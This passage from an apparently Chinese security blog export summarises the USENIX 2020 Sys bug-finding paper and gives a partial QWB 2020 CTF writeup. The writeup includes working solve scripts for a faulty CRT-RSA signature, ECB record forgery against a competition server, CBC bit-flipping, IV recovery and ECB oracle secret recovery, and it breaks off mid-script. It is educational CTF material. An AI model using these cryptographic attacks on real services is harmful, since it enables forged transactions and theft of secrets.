rel="noopener">https://blog.csdn.net/qq_38154820/article/details/108212123</a></li><li><a href="https://www.secshi.com/17824.html" target="_blank" rel="noopener">https://www.secshi.com/17824.html</a></li><li><a href="https://github.com/Lefnui/ctf-writeups/blob/e3d4efdc73af7de3051e958c8ef04022c9c71ad3/2019/de1ctf/crypto/babylfsr/solve.py" target="_blank" rel="noopener">https://github.com/Lefnui/ctf-writeups/blob/e3d4efdc73af7de3051e958c8ef04022c9c71ad3/2019/de1ctf/crypto/babylfsr/solve.py</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Sys: a Static/Symbolic Tool for Finding Good Bugs in Good (Browser) Code(USENIX 2020)</title>
    <url>/bc8e474f.html</url>
    <content><![CDATA[<blockquote><p>作者设计了一个可扩展的漏洞发现工具(Sys)，并且在已经被好多自动化工具检查过的软件中发现了一些漏洞，比如说Chrome，Firefox，以及sqlite3。</p><p>整个系统分为两个部分：首先通过静态分析定位可能存在漏洞的地方，然后在对这些备选项通过符号执行的方法进一步确认。这样就在漏洞发现的速度 和 准确率上得到了一个平衡。</p></blockquote><a id="more"></a><h3><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h3><p>研究原因：现在的大厂对产品安全问题都十分重视,Chrome、Firefox、Sqlite都是经过好多Fuzzer的检测才发布，所以想要在这些产品里找bug是难上加难，之前实验室里发布的符号执行工具KLEE已经不能解决这个问题了。</p><p>众所周知，静态分析：速度快但不准确，动态符号执行：速度慢准确。所以两者结合就在速度和准确度上做了一个平衡，这也是Sys的想法。</p><p>第一步：静态分析pass确定可能的error点。并且用户可以写自己的静态分析规则来定位potential error</p><p>第二步：对第一步的结果进行符号执行确认，去除误报。用户也可以写自己的符号习性checker。</p><p>Sys的符号执行并不是执行所有的片段，而是执行一部分代码，因为大部分的bug都是存在于一小部分上下文中的，比如说找无限循环，只要看for循环就可以了，这样也减少了符号执行的资源开销。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-27-081021.png" alt="image-20200827161021264"></p><p>以上就是Sys在三个软件中找到的bugs总结。</p><p>因为在现实中的软件都是不一样且有高度交互的，所以在设计系统的时候为了用户定制，也实现了一套语言(DSL)，用户使用DSL语言在上层写自己的checker，然后剩下的转换都交给Sys完成。</p><p><strong>贡献点</strong>：</p><ul><li>Sys系统和自带的5个checker</li><li>一种大规模软件符号执行的方法</li><li>DSL语言，方便用户自定义</li></ul><h3><span id="psystem-overview">System Overview</span><a href="#psystem-overview" class="header-anchor">#</a></h3><p>拿一个Sqlite的例子来说，用户只需要提供一个checker和一个LLVM的IR文件给Sys，就可以得到最终的bug报告。感觉还是很易用的呢，不过看了他论文实验的机器配置，虽然开源了代码，但让人丝毫没有想用的兴趣</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-27-081707.png" alt="image-20200827161706760"></p><p>Sys发现bug三部曲：</p><ul><li>静态扫描</li><li>动态符号执行确认</li><li>总结报告</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-27-084122.png" alt="image-20200827164121733"></p><h4><span id="pstatic">Static</span><a href="#pstatic" class="header-anchor">#</a></h4><p>静态扫描部分是允许用户扩展的，也就是上图里的extenson。这一步和其他的静态审计工具差不多，先使用LLVM生成中间IR文件，然后解析CFG，根据用Haskell语言写的extension检测bug。</p><p>但也和其他的静态工具有一点不同，之前的静态工具为了低误报都检查的比较细，但Sys不需要,因为它的误报低有动态符号执行来保证,所以在这一步可以选择检测出较多的可能bug,然后交给符号执行。</p><p>下面是一个Static 扩展的例子，用来找内存越界的问题</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-27-084844.png" alt="image-20200827164843936"></p><h4><span id="psymbolic">Symbolic</span><a href="#psymbolic" class="header-anchor">#</a></h4><ul><li>自动符号执行完整路径</li><li>使用用户定义的checker判断是否为漏洞</li></ul><p>Sys的符号执行在内存拷贝的基础上进行，在IR上建立约束关系和逻辑表达式，然后加入用户的checker，最后使用SMT求解器求解关系是否可达。下面是一个Symbolic checker的例子</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-27-124415.png" alt="image-20200827204415589"></p><p>同时Sys在执行的时候也会跳过无关的语句和函数（类似于函数切片的思想，去除无关语句的执行，提高效率）</p><h4><span id="punknown-state">Unknown state</span><a href="#punknown-state" class="header-anchor">#</a></h4><p>由于只执行部分上下文，所以中间一些相关变量的状态都是没法确定的，这也是Sys的一个不足之处。所以Sys在执行时需要自己去伪造这些状态，并且确保这些丢失的约束信息不会造成误报。</p><p>在第一点上，Sys采用的是懒分配的方法，也就是用的时候再分配内存够。比如说当出现解引用的时候，就分一块内存给变量。但由于位置的状态，所以造成误报是可能存在的，但是Sys有可以确保这种情况尽量的少：</p><ol><li>Sys会探索所有可能的路径</li><li>只要找部分上下文错误，而不是确保函数都正确</li><li>checker提供的漏洞存在时满足的条件信息</li><li>大量的误报必然存在根本原因，Sys可以通过ad hoc,checker的定义技巧解决这个问题</li></ol><h3><span id="psysdsl-design">SysDSL design</span><a href="#psysdsl-design" class="header-anchor">#</a></h3><p>算是一种好的语言设计的原则吧：</p><ul><li><p>基于特定领域的，带有领域特性</p></li><li><p>有足够表达能力的，就是尽量保证能做自己想做的所有事</p></li><li><p>简单，比如python</p></li><li><p>多类型且安全的</p></li></ul><h4><span id="pstatic-extensiions">Static extensiions</span><a href="#pstatic-extensiions" class="header-anchor">#</a></h4><p>静态分析在LLVM的Bytecode上完成，理由如下：</p><ol><li>可以把静态pass和动态pass结合在一起</li><li>在LLVM的IR上可以对任何语言进行扩展</li><li>可以看到C++语言相对底层的东西</li><li>可以考虑到编译的优化选项</li></ol><h4><span id="psysdsl">SysDSL</span><a href="#psysdsl" class="header-anchor">#</a></h4><p>使用SysDSL设计好符号执行的checker以后，会自动的将对应的LLVM指令转换成SMT约束表达，包括算数表达，比较，类型转换等等。</p><p>同时SysDSL也完成了对每一条LLVM指令的表达，这样可以让用户更好的实现checker的功能</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-28-072606.png" alt="image-20200828152605972"></p><h3><span id="pmemory-design">Memory Design</span><a href="#pmemory-design" class="header-anchor">#</a></h3><p>核心：将所有的对象什么使用的内存表示为连续的数组</p><p>原因：</p><ul><li>现在的SMT求解器对数组的支持很好</li><li>对于C++中的多级指针，用数组可以很方便的表示，比如<code>***P</code>用数组表示为<code>mem[mem[mem[p]]]</code></li></ul><p>Sys也采用了Valdrind等工具一样的Shadow memory方法</p><p>缺点：</p><ul><li>慢！</li><li>内存读取越界问题（可通过一些方法解决）</li></ul><h3><span id="pusing-sys-to-find-bugs">Using Sys to find bugs</span><a href="#pusing-sys-to-find-bugs" class="header-anchor">#</a></h3><p>通过实例索命Sys的两个优点：</p><ul><li>对漏洞的表达能力</li><li>找新bug的效率</li></ul><p>我发现这个论文用了好大的篇幅来一遍一遍的吹，服了</p><h4><span id="puninitialized-memory">uninitialized memory</span><a href="#puninitialized-memory" class="header-anchor">#</a></h4><p>静态checker：一个变量分配了内存，但没有明显的写入</p><p>动态checker：用shadow memory的看是不是真的没有对那块内存进行写入</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-28-075101.png" alt="image-20200828155101240"></p><p>然后也是在Chrome、Firefox、FreeBSD里找到了一些变量未初始化漏洞</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-28-075212.png" alt="image-20200828155211996"></p><h4><span id="pheap-out-of-bounds">Heap out-of-bounds</span><a href="#pheap-out-of-bounds" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-28-075353.png" alt="image-20200828155353032"></p><h4><span id="pconcrete-out-of-bounds">Concrete out-of-bounds</span><a href="#pconcrete-out-of-bounds" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-08-28-075439.png" alt="image-20200828155439518"></p><h4><span id="punvalidated-user-data">Unvalidated user data</span><a href="#punvalidated-user-data" class="header-anchor">#</a></h4><blockquote><p>The checker traces untrusted values copied from user space, using the solver to flag errors if (1) an untrusted value used as an array index can be enormous; or (2) an untrusted value passed as a size parameter (e.g., to memcpy) could cause overflow.</p></blockquote><h3><span id="pconclusion">Conclusion</span><a href="#pconclusion" class="header-anchor">#</a></h3><p>总的来说：Sys结合了静态分析和动态符号执行的优点，在速度和准确率上做了一个平衡，并且比较好的是，由于只符号执行部分上下文，所以在大型软件上有很大的优势，并且设计的SysDSL语言和Sys系统更配哦。</p><p>github官方出品的CodeQL工具，让我们可以静态的写checker查询，但没有符号执行，所以都得一个一个确认，如果能够自己在CodeQL的结果中写一套符号执行帮我们过滤到误报，感觉也是一个不错的选择</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2020 部分writeup</title>
    <url>/40c735f5.html</url>
    <content><![CDATA[<blockquote><p>简单记录一下做出的几道题目，以后还是科研为主科研为主</p></blockquote><a id="more"></a><h3><span id="pbabycrt">babyCRT</span><a href="#pbabycrt" class="header-anchor">#</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># task.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_t</span><span class="params">(d)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t = getPrime(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> t % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> libnum.gcd(d, t - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m, params)</span>:</span></span><br><span class="line">    d, p, q, n, t1, t2, e1, e2 = params</span><br><span class="line">    dp = d % ((p - <span class="number">1</span>) * (t1 - <span class="number">1</span>))</span><br><span class="line">    dq = d % ((q - <span class="number">1</span>) * (t2 - <span class="number">1</span>))</span><br><span class="line">    k = getPrime(<span class="number">16</span>)</span><br><span class="line">    Sp = pow(m + k, dp, p * t1)</span><br><span class="line">    Sq = pow(m, dq, q * t2)</span><br><span class="line">    Cp = q * t2 * libnum.invmod(q * t2, p * t1)</span><br><span class="line">    Cq = p * t1 * libnum.invmod(p * t1, q * t2)</span><br><span class="line">    S = (Cp * Sp + Cq * Sq) % (n * t1 * t2)</span><br><span class="line">    c1 = (m - pow(S, e1, t1) + <span class="number">1</span>) % t1</span><br><span class="line">    c2 = (m - pow(S, e2, t2) + <span class="number">1</span>) % t2</span><br><span class="line">    <span class="keyword">return</span> pow(S, c1 * c2, n)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> p &lt; q</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"flag&#123;"</span> + sha1(long_to_bytes(p)).hexdigest() + <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">print(n)</span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">t1 = gen_t(d)</span><br><span class="line">et1 = libnum.invmod(d, t1 - <span class="number">1</span>)</span><br><span class="line">t2 = gen_t(d)</span><br><span class="line">et2 = libnum.invmod(d, t2 - <span class="number">1</span>)</span><br><span class="line">params = (d, p, q, n, t1, t2, et1, et2)</span><br><span class="line">m = randint(<span class="number">1</span>, n<span class="number">-1</span>)</span><br><span class="line">print(m)</span><br><span class="line">sig = sign(m, params)</span><br><span class="line">print(sig)</span><br></pre></td></tr></table></figure><p>论文题：<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.510.3146&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener">http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.510.3146&amp;rep=rep1&amp;type=pdf</a></p><p>结论：$gcd(m^{c_1} - {Sig}^e,N)=p$</p><p>所以爆破$c_1$就行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span></span><br><span class="line">m = <span class="number">26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540</span></span><br><span class="line">s = <span class="number">20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    p = gcd(pow(m, c1, n)-pow(s, e, n), n)</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="number">1</span> <span class="keyword">and</span> n % p == <span class="number">0</span>):</span><br><span class="line">        q = n//p</span><br><span class="line">        print(p*q==n)</span><br><span class="line">        print(<span class="string">"flag&#123;"</span> + sha1(long_to_bytes(p)).hexdigest() + <span class="string">"&#125;"</span>)</span><br><span class="line">        print(<span class="string">"flag&#123;"</span> + sha1(long_to_bytes(q)).hexdigest() + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure><h2><span id="pbank">bank</span><a href="#pbank" class="header-anchor">#</a></h2><p>nc看了下可以知道是ECB模式加密了sender+receiver+money，所以通过加密可以知道自己的账号对应的密文，同时在recorder里可以看到哪些人在相互转钱，题目让我们可以提供recorder来伪造其他账户转钱给自己，所以思路就很简单了：</p><ol><li>加密一次，得到自己的账号</li><li>得到所有已有的其他账户信息</li><li>伪造recorder让其他账户给自己打钱</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import string</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&#39;39.101.134.52&#39;, 8005)</span><br><span class="line"></span><br><span class="line">def proof_of_work(token):</span><br><span class="line">    p.recvuntil(&quot;sha256(XXX+&quot;)</span><br><span class="line">    pad &#x3D; p.recvuntil(&quot;)&quot;)[:-1]</span><br><span class="line">    p.recvuntil(&quot; &#x3D;&#x3D; &quot;)</span><br><span class="line">    target &#x3D; bytes.fromhex(p.recvline().strip().decode())</span><br><span class="line">    for s in itertools.product(string.printable, repeat&#x3D;3):</span><br><span class="line">        if sha256(&#39;&#39;.join(s).encode()+pad).digest() &#x3D;&#x3D; target:</span><br><span class="line">            p.sendlineafter(&quot;Give me XXX:&quot;, &#39;&#39;.join(s))</span><br><span class="line">            p.sendlineafter(&quot;teamtoken:&quot;, token)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">token &#x3D; &#39;&#39;</span><br><span class="line">proof_of_work(token)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;give me your name:&quot;, &quot;ycdxsb&quot;)</span><br><span class="line">p.sendlineafter(&quot;&gt; &quot;, &quot;transact&quot;)</span><br><span class="line">p.sendlineafter(&quot;&gt; &quot;, &quot;Mote 10&quot;)</span><br><span class="line">receiver &#x3D; p.recvline().strip()[:32]</span><br><span class="line">p.sendlineafter(&quot;&gt; &quot;, &quot;view records&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">senders &#x3D; []</span><br><span class="line">cashs &#x3D; []</span><br><span class="line">for i in range(10):</span><br><span class="line">    line &#x3D; p.recvline().strip()</span><br><span class="line">    senders.append(line[32:-32])</span><br><span class="line">    cashs.append(line[-32:])</span><br><span class="line">print(senders)</span><br><span class="line">print(cashs)</span><br><span class="line">for i in range(10):</span><br><span class="line">    payload &#x3D; senders[i]+receiver+cashs[i]</span><br><span class="line">    p.sendlineafter(&quot;&gt; &quot;, &quot;provide a record&quot;)</span><br><span class="line">    p.sendlineafter(&quot;&gt; &quot;, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">p.sendline(&#39;get flag&#39;)</span><br><span class="line">import time</span><br><span class="line">time.sleep(1)</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure><h2><span id="pmodestudy">modestudy</span><a href="#pmodestudy" class="header-anchor">#</a></h2><p>是真的让人头大</p><p>六个Chanllege 分别对应：</p><ul><li>CBC 字节翻转攻击</li><li>CBC预测iv</li><li>ECB 块加密，可以发现有两个块只差一个字节，可以通过覆盖修改admin=0 为admin=1(<code>session:dfc684a3;timedl=1;admin=0;guess_cookie_ma=1;guess_mp_ab=1;guess_cookie_mb=0;hell_pad=233</code>)</li><li>ECB padding oracle</li><li>自己写的ECB块加密，两个字节为一个块，先建立明文和密文的字典，然后直接爆破</li><li>CBC padding oracle</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># get Challedge dict</span></span><br><span class="line"><span class="string">idx = 0</span></span><br><span class="line"><span class="string">for key in d.keys():</span></span><br><span class="line"><span class="string">    if(ord(d[key][0])&gt;=idx):</span></span><br><span class="line"><span class="string">        idx = ord(d[key][0])</span></span><br><span class="line"><span class="string">for i in range(idx,256):</span></span><br><span class="line"><span class="string">    for j in range(32):</span></span><br><span class="line"><span class="string">        sendmsg = ""</span></span><br><span class="line"><span class="string">        for k in range(8):</span></span><br><span class="line"><span class="string">            sendmsg += chr(i)+chr(8*j+k)</span></span><br><span class="line"><span class="string">        io.read_until('your choice:')</span></span><br><span class="line"><span class="string">        io.writeline('1')</span></span><br><span class="line"><span class="string">        io.read_until('input(encode hex):')</span></span><br><span class="line"><span class="string">        io.writeline(sendmsg.encode('hex'))</span></span><br><span class="line"><span class="string">        line = io.readline().strip()</span></span><br><span class="line"><span class="string">        line = line.split(':')[1]</span></span><br><span class="line"><span class="string">        for k in range(8):</span></span><br><span class="line"><span class="string">            d[line[4*k:4*k+4]] = chr(i)+chr(8*j+k)</span></span><br><span class="line"><span class="string">        #print(d)</span></span><br><span class="line"><span class="string">    with open('challege5.pickle','wb') as f:</span></span><br><span class="line"><span class="string">        pickle.dump(d,f)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span><span class="params">(io, difficulty)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"[+] sha256("</span>)</span><br><span class="line">    prefix = io.read_until(<span class="string">"+"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        answer = <span class="string">''</span>.join(random.choice(</span><br><span class="line">            string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>))</span><br><span class="line">        hashresult = hashlib.sha256(prefix+answer).digest()</span><br><span class="line">        bits = <span class="string">''</span>.join(bin(ord(j))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hashresult)</span><br><span class="line">        <span class="keyword">if</span> bits.startswith(<span class="string">'0'</span>*difficulty):</span><br><span class="line">            io.read_until(<span class="string">"="</span>)</span><br><span class="line">            io.writeline(answer)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">token = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'139.224.254.172'</span></span><br><span class="line">target = (ip, <span class="number">7777</span>)</span><br><span class="line">io = zio(target, timeout=<span class="number">1000000</span>, print_read=COLORED(</span><br><span class="line">    RAW, <span class="string">'red'</span>), print_write=COLORED(RAW, <span class="string">'green'</span>))</span><br><span class="line">passpow(io, <span class="number">5</span>)</span><br><span class="line">io.writeline(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 1</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">message = io.readline().strip().split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">cookie = message.split(<span class="string">';checksum='</span>)[<span class="number">0</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">checksum = message.split(<span class="string">';checksum='</span>)[<span class="number">1</span>]</span><br><span class="line">target = cookie[:<span class="number">31</span>]+<span class="string">'1'</span></span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">'cookie:'</span>+cookie)</span><br><span class="line">print(<span class="string">'checksum:'</span>+checksum)</span><br><span class="line">print(<span class="string">'target:'</span>+target)</span><br><span class="line">checksum = long_to_bytes(int(checksum, <span class="number">16</span>))</span><br><span class="line">print([checksum], len(checksum))</span><br><span class="line">checksum = checksum[<span class="number">0</span>:<span class="number">15</span>]+chr(<span class="number">0x49</span> ^ <span class="number">0x48</span> ^ ord(checksum[<span class="number">15</span>]))+checksum[<span class="number">16</span>:]</span><br><span class="line">result = target+<span class="string">';checksum='</span>+binascii.b2a_hex(checksum)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Challege 1:"</span>, result)</span><br><span class="line">io.writeline(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 2</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">iv_sha256  = io.readline().strip().split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(iv_sha256)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">A = <span class="string">'1'</span>*<span class="number">16</span></span><br><span class="line">B = <span class="string">'1'</span>*<span class="number">16</span></span><br><span class="line">io.read_until(<span class="string">'c:'</span>)</span><br><span class="line">io.writeline(A+B)</span><br><span class="line">line = io.readline().strip().split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">plaintext = long_to_bytes(int(line,<span class="number">16</span>))</span><br><span class="line">D = bytes_to_long(<span class="string">b'1'</span>*<span class="number">16</span>)^bytes_to_long(plaintext[<span class="number">16</span>:])</span><br><span class="line">iv = D^bytes_to_long(plaintext[:<span class="number">16</span>])</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line">print(iv)</span><br><span class="line">print(hashlib.sha256(iv).hexdigest())</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.read_until(<span class="string">'iv(encode hex):'</span>)</span><br><span class="line">io.writeline(iv.encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 3</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">cookie = io.readline().strip()[<span class="number">11</span>:]</span><br><span class="line">ciphertext = io.readline().strip().split(<span class="string">'(cookie):'</span>)[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"cookie:"</span>+cookie)</span><br><span class="line">print(<span class="string">"ciphtertext:"</span>+ciphertext)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'input your encrypted cookie(encode hex):'</span>)</span><br><span class="line">ciphertext = list(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    ciphertext[<span class="number">64</span>+i] = ciphertext[<span class="number">128</span>+i]</span><br><span class="line">result = <span class="string">''</span>.join(ciphertext)</span><br><span class="line">io.writeline(result)</span><br><span class="line">print(<span class="string">"Challege 3:"</span>, result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 4</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">secret_sha256 = line.split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"sha256(secret):"</span>+secret_sha256)</span><br><span class="line">guess = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">        io.writeline(<span class="string">'1'</span>)</span><br><span class="line">        sendmsg = chr(ch)+guess+<span class="string">'\x00'</span>*<span class="number">16</span></span><br><span class="line">        io.read_until(<span class="string">'input(encode hex):'</span>)</span><br><span class="line">        io.writeline(sendmsg.encode(<span class="string">'hex'</span>))</span><br><span class="line">        line = io.readline()</span><br><span class="line">        ciphertext = io.readline().strip().split(<span class="string">'msg: '</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(ciphertext[<span class="number">0</span>:<span class="number">32</span>] == ciphertext[<span class="number">64</span>:]):</span><br><span class="line">            guess = chr(ch)+guess</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># io.interact()</span></span><br><span class="line">    print(guess)</span><br><span class="line">print(<span class="string">"Challege 4:"</span>, guess)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.read_until(<span class="string">'secret(encode hex):'</span>)</span><br><span class="line">io.writeline(guess.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="comment"># edd11570a9bad21c0d6d97d32cc36674</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challege 5</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'5'</span>)</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">line = io.readline()</span><br><span class="line">secret = line.strip().split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"secret:"</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'challege5.pickle'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	d = pickle.load(f)</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    result += d[secret[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>]]</span><br><span class="line">print(<span class="string">'Challege 5:'</span>+result)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.read_until(<span class="string">'secret(encode 